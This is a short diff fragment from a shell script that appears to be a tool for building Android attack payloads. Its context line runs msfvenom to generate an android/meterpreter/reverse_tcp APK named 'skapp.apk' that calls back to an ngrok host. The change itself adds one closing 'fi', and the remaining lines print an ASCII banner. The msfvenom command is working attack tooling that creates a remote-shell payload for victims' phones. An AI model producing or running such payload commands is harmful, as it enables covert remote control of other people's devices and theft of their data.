@@ -148,6 +148,7 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$lport R 
 echo -e "Payload name is $cyan skapp.apk"
 echo -e "$green Payload Saved In Sdcard" 
 fi
+fi
 echo -e "$grey  ___________ "
 echo -e "$cyan /   _____/  | __ "
 echo -e "$blue \_____   \| |/ / "
